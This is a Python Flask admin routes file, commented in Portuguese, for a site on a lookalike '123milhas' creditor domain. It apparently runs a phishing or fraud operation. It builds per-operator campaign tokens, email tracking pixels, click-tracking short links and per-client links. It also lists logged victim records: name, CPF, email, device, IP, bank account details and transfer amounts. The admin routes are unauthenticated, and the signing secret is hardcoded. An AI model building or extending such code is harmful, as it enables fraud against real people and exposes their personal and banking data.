# app/routes/admin_routes.py
from flask import Blueprint, request, jsonify
import sqlite3
import json
import string
import random
import hmac
import hashlib
import base64
import time
from datetime import datetime
from zoneinfo import ZoneInfo

admin_bp = Blueprint("admin", __name__)

# ============================================
# CONFIGURAÇÕES PARA TOKEN
# ============================================
TRACKING_SECRET = b"123milhas-secret-key-2024"
BASE_URL = "https://123milhas-rj-credor.com.br"


def now_utc():
    return datetime.now(ZoneInfo("UTC")).strftime("%Y-%m-%d %H:%M:%S")


def now_brasilia():
    return datetime.now(ZoneInfo("America/Sao_Paulo")).strftime("%Y-%m-%d %H:%M:%S")


def sign_payload(data: dict) -> str:
    payload = json.dumps(data, separators=(",", ":"), ensure_ascii=False).encode()
    sig = hmac.new(TRACKING_SECRET, payload, hashlib.sha256).hexdigest()
    raw = base64.urlsafe_b64encode(payload).decode().rstrip("=")
    return f"{raw}.{sig}"


def make_tracking_token(operator: str, campaign: str, client_id: str, email: str = "") -> str:
    ts = int(time.time())
    return sign_payload({
        "operator": operator,
        "campaign": campaign,
        "client_id": client_id,
        "email": email,
        "ts": ts,
    })


def gerar_codigo_curto(tamanho=8):
    caracteres = string.ascii_letters + string.digits
    return "".join(random.choices(caracteres, k=tamanho))


def criar_link_curto(original_url):
    conn = sqlite3.connect("123milhas.db")
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS short_links (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            short_code TEXT UNIQUE,
            original_url TEXT,
            created_at TEXT,
            nome_cliente TEXT
        )
    """)
    conn.commit()

    cursor.execute("SELECT short_code FROM short_links WHERE original_url = ?", (original_url,))
    existing = cursor.fetchone()
    if existing:
        conn.close()
        return f"{BASE_URL}/s/{existing[0]}"

    while True:
        short_code = gerar_codigo_curto(8)
        cursor.execute("SELECT id FROM short_links WHERE short_code = ?", (short_code,))
        if not cursor.fetchone():
            break

    cursor.execute(
        "INSERT INTO short_links (short_code, original_url, created_at) VALUES (?, ?, ?)",
        (short_code, original_url, now_brasilia()),
    )
    conn.commit()
    conn.close()
    return f"{BASE_URL}/s/{short_code}"


# ============================================
# ROTA PARA GERAR TOKEN (Campanhas)
# ============================================

@admin_bp.route("/generate_token", methods=["POST"])
def generate_tracking_token():
    try:
        data = request.json
        operator = data.get("operator", "admin")
        campaign = data.get("campaign")
        client_id = data.get("client_id")
        email = data.get("email", "")

        if not campaign or not client_id:
            return jsonify({"success": False, "message": "Campaign e client_id são obrigatórios"}), 400

        token = make_tracking_token(operator, campaign, client_id, email)

        conn = sqlite3.connect("123milhas.db")
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS email_sends (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                operator TEXT NOT NULL,
                campaign TEXT NOT NULL,
                client_id TEXT,
                email TEXT,
                sent_at TEXT NOT NULL,
                ip TEXT,
                user_agent TEXT
            )
        """)
        conn.commit()

        cursor.execute(
            "INSERT INTO email_sends (operator, campaign, client_id, email, sent_at, ip, user_agent) VALUES (?, ?, ?, ?, ?, ?, ?)",
            (operator, campaign, client_id, email, now_brasilia(), request.remote_addr, request.headers.get("User-Agent", "")),
        )
        conn.commit()
        conn.close()

        pixel_url = f"{BASE_URL}/api/track/email/{token}"
        click_url = f"{BASE_URL}/api/track/click/{token}"
        click_curto = criar_link_curto(click_url)

        return jsonify({
            "success": True,
            "token": token,
            "pixel_url": pixel_url,
            "click_url_base": click_curto,
            "click_url_original": click_url,
            "message": "Token gerado com sucesso",
        })
    except Exception as e:
        print(f"Erro ao gerar token: {e}")
        return jsonify({"success": False, "message": str(e)}), 500


# ============================================
# ROTA PARA GERAR LINK CURTO ALEATÓRIO (COM NOME DO CLIENTE)
# ============================================

@admin_bp.route("/gerar_link", methods=["POST"])
def gerar_link_curto():
    try:
        data = request.json
        url_destino = data.get("url", f"{BASE_URL}/")
        nome_cliente = data.get("nome_cliente", "")

        if not url_destino.startswith("http"):
            url_destino = f"https://{url_destino}"

        conn = sqlite3.connect("123milhas.db")
        cursor = conn.cursor()

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS short_links (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                short_code TEXT UNIQUE,
                original_url TEXT,
                created_at TEXT,
                nome_cliente TEXT
            )
        """)
        conn.commit()

        while True:
            codigo = gerar_codigo_curto(8)
            cursor.execute("SELECT id FROM short_links WHERE short_code = ?", (codigo,))
            if not cursor.fetchone():
                break

        cursor.execute(
            "INSERT INTO short_links (short_code, original_url, created_at, nome_cliente) VALUES (?, ?, ?, ?)",
            (codigo, url_destino, now_brasilia(), nome_cliente),
        )
        conn.commit()
        conn.close()

        link_curto = f"{BASE_URL}/s/{codigo}"

        return jsonify({
            "success": True,
            "short_code": codigo,
            "short_url": link_curto,
            "original_url": url_destino,
            "created_at": now_brasilia(),
            "nome_cliente": nome_cliente
        })
    except Exception as e:
        print(f"Erro ao gerar link: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


# ============================================
# ROTA PARA LISTAR LINKS GERADOS (COM NOME_CLIENTE)
# ============================================

@admin_bp.route("/links", methods=["GET"])
def listar_links():
    try:
        conn = sqlite3.connect("123milhas.db")
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()

        cursor.execute("""
            SELECT 
                sl.short_code,
                sl.original_url,
                sl.created_at,
                sl.nome_cliente,
                COUNT(lc.id) as total_cliques
            FROM short_links sl
            LEFT JOIN link_clicks lc ON sl.short_code = lc.short_code
            GROUP BY sl.short_code
            ORDER BY sl.created_at DESC
            LIMIT 100
        """)

        rows = cursor.fetchall()
        conn.close()

        links = []
        for row in rows:
            links.append({
                "short_code": row["short_code"],
                "short_url": f"{BASE_URL}/s/{row['short_code']}",
                "original_url": row["original_url"],
                "created_at": row["created_at"],
                "nome_cliente": row["nome_cliente"] or "",
                "cliques": row["total_cliques"] or 0
            })

        return jsonify({"success": True, "total": len(links), "links": links})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


# ============================================
# ROTA PARA RESETAR LINKS (APENAS LINKS E CLIQUES)
# ============================================

@admin_bp.route("/resetar_links", methods=["DELETE"])
def resetar_links():
    try:
        confirmacao = request.args.get("confirmar", "").lower()
        if confirmacao != "sim":
            return jsonify({"success": False, "error": "Use ?confirmar=sim"}), 400

        conn = sqlite3.connect("123milhas.db")
        cursor = conn.cursor()

        cursor.execute("SELECT COUNT(*) FROM short_links")
        links_antes = cursor.fetchone()[0]

        cursor.execute("SELECT COUNT(*) FROM link_clicks")
        cliques_antes = cursor.fetchone()[0]

        cursor.execute("DELETE FROM short_links")
        links_removidos = cursor.rowcount

        cursor.execute("DELETE FROM link_clicks")
        cliques_removidos = cursor.rowcount

        cursor.execute("DELETE FROM sqlite_sequence WHERE name IN ('short_links', 'link_clicks')")
        conn.commit()
        conn.close()

        return jsonify({
            "success": True,
            "message": f"✅ {links_removidos} links e {cliques_removidos} cliques removidos!",
            "links_removidos": links_removidos,
            "cliques_removidos": cliques_removidos,
            "links_antes": links_antes,
            "cliques_antes": cliques_antes
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


# ============================================
# ROTAS DE CONSULTA (Transferências)
# ============================================

@admin_bp.route("/consultar", methods=["GET"])
def consultar_tudo():
    try:
        conn = sqlite3.connect("123milhas.db")
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()

        nome = request.args.get("nome", "").strip()
        cpf = request.args.get("cpf", "").strip()
        data_inicio = request.args.get("data_inicio", "").strip()
        data_fim = request.args.get("data_fim", "").strip()
        status = request.args.get("status", "").strip()

        query = """
            SELECT 
                t.transferencia_id as id,
                t.banco_nome as banco,
                t.agencia,
                t.conta,
                t.valor,
                t.status,
                t.created_at as data,
                v.nome as cliente_nome,
                v.cpf as cliente_cpf,
                v.email as cliente_email,
                v.dispositivo_tipo,
                v.dispositivo_os,
                v.dispositivo_browser,
                v.ip_address as ip,
                v.created_at as data_cadastro
            FROM transferencias_registro t
            LEFT JOIN tracking_visits v ON t.tracking_id = v.tracking_id
            WHERE 1=1
        """
        params = []

        if nome:
            query += " AND v.nome LIKE ?"
            params.append(f"%{nome}%")
        if cpf:
            cpf_limpo = cpf.replace(".", "").replace("-", "")
            query += " AND v.cpf = ?"
            params.append(cpf_limpo)
        if data_inicio:
            query += " AND date(t.created_at) >= date(?)"
            params.append(data_inicio)
        if data_fim:
            query += " AND date(t.created_at) <= date(?)"
            params.append(data_fim)
        if status:
            query += " AND t.status = ?"
            params.append(status)

        query += " ORDER BY t.created_at DESC LIMIT 100"
        cursor.execute(query, params)
        rows = cursor.fetchall()
        conn.close()

        transferencias = [dict(row) for row in rows]
        return jsonify({"success": True, "total": len(transferencias), "transferencias": transferencias})
    except Exception as e:
        print(f"Erro: {e}")
        return jsonify({"success": False, "error": str(e)}), 500


@admin_bp.route("/estatisticas", methods=["GET"])
def estatisticas():
    try:
        conn = sqlite3.connect("123milhas.db")
        cursor = conn.cursor()

        cursor.execute("SELECT COUNT(*) FROM transferencias_registro")
        total = cursor.fetchone()[0]

        cursor.execute("SELECT COUNT(DISTINCT cpf) FROM tracking_visits WHERE cpf IS NOT NULL AND cpf != ''")
        clientes = cursor.fetchone()[0]

        cursor.execute("SELECT COUNT(*) FROM transferencias_registro WHERE date(created_at) = date('now', 'localtime')")
        hoje = cursor.fetchone()[0]

        cursor.execute("SELECT COUNT(*) FROM short_links")
        total_links = cursor.fetchone()[0]

        cursor.execute("SELECT COUNT(*) FROM link_clicks")
        total_cliques = cursor.fetchone()[0]

        conn.close()
        return jsonify({
            "success": True,
            "total_transferencias": total,
            "total_clientes": clientes,
            "transferencias_hoje": hoje,
            "total_links": total_links,
            "total_cliques": total_cliques
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500


@admin_bp.route("/detalhe/<transferencia_id>", methods=["GET"])
def detalhe(transferencia_id):
    try:
        conn = sqlite3.connect("123milhas.db")
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("""
            SELECT 
                t.*,
                v.nome, v.cpf, v.email, v.dispositivo_tipo, v.dispositivo_os,
                v.dispositivo_browser, v.ip_address, v.user_agent
            FROM transferencias_registro t
            LEFT JOIN tracking_visits v ON t.tracking_id = v.tracking_id
            WHERE t.transferencia_id = ?
        """, (transferencia_id,))
        row = cursor.fetchone()
        conn.close()

        if not row:
            return jsonify({"success": False, "error": "Não encontrado"}), 404
        return jsonify({"success": True, "transferencia": dict(row)})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500
